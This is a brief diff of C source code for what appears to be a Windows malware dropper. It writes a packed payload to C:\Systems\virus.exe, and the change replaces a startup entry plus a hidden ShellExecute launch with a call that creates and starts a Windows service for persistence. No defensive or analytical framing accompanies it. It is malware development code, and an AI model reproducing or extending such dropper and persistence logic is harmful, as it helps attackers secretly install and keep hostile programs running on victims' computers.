@@ -21,16 +21,7 @@ int main(int argc, char *argv[])
 
    create_path();
    create_new_pe(L"C:\\Systems\\virus.exe", packed_data, packed_size);
-   add_to_startup();
-
-   ShellExecute(
-      NULL,
-      L"open",
-      L"C:\\Systems\\virus.exe",
-      L"-l",
-      NULL,
-      SW_HIDE
-   );
+   create_and_start_service();
 
    return 0;
 }
